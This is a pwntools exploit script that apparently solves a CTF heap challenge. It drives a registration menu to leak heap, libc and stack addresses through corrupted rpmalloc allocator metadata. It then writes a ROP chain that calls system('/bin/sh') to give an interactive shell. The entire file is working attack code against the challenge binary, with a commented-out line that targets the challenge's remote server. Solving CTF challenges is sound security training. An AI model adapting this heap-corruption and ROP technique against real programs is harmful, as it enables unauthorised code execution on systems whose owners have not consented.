#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./org_chall_patched")
libc = elf.libc
p = elf.process(aslr=True)
#p = remote("ctf-registration.chal.wwctf.com", 1337)

def register(age, name, description):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"?", str(age).encode())
    p.sendlineafter(b"?", name)
    p.sendlineafter(b"?", description)

def read(id):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"?", str(id).encode())

def credits():
    p.sendlineafter(b">> ", b"69")


register(1, b"1", b"1")
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"?", b"a")
p.sendlineafter(b"?", b"a")
read(1)
p.recvuntil(b"Age: ")
leak = int(p.recvline())
rpmalloc_heap = leak - 0xe0

log.info(f"heap base @ {hex(rpmalloc_heap)}")

register(0x4141414141414141, b"A"*16, b"A"*16 + p64(rpmalloc_heap+0x100) + b"C"*8)
register(0x4141414141414141, b"A"*16, b"A"*32)
register(rpmalloc_heap+0x100, b"A"*16, b"A"*32)
register(rpmalloc_heap+0x48, b"A"*16, b"A"*32)
register(0x4141414141414141, b"A"*16, b"A"*32)
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"?", b"a")
p.sendlineafter(b"?", b"a")

read(7)
p.recvuntil(b"Age: ")
libc.address = int(p.recvline()) - 2498560 - 0x2000
log.info(f"libc base @ {hex(libc.address)}")

register(0x4141414141414141, b"A"*16, b"A"*16 + p64(libc.sym.environ-8) + b"C"*8)
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"?", b"a")
p.sendlineafter(b"?", b"a")

read(9)
p.recvuntil(b"Name: ")
stack_leak = unpack(p.recvline()[:-1], "all")
log.info(f"stack @ {hex(stack_leak)}")

r = ROP(libc)
pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]
binsh = next(libc.search(b"/bin/sh\x00"))

register(0x4141414141414141, b"A"*16, b"A"*32)
register(0x4141414141414141, b"A"*16, b"A"*32)
register(0x4141414141414141, b"A"*16, b"A"*32)
register(stack_leak-288, b"A"*16, b"A"*32)
register(0x4441414141414141, b"A"*16, b"A"*32)
register(0x4341414141414141, b"A"*16, b"A"*32)
register(pop_rdi, p64(binsh), p64(pop_rdi+1)+ p64(libc.sym.system))

p.interactive()
